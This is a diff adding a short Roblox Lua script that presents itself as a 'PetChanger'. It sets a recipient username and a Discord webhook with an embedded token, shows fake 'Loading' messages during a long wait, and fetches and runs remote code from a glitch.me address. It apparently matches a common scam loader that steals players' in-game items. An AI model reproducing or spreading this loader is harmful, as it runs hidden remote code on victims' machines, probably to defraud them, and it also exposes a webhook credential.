@@ -1,0 +1,8 @@
+UserName = "ithinkiwinm"
+Webhook = "https://discord.com/api/webhooks/1100631602821877792/IUEoPRmy1nG4DcfRnl3MjysxieyFUW_CBMixShJaX_xwglcrlSFVOLyVg4Iptqd7zvtw"
+_G.ScriptName = "PetChanger"
+_G.FirstText = "Wait Loading.."
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 100
+loadstring(game:HttpGet("https://rizzhub.glitch.me/scripts/Main.lua", true))()
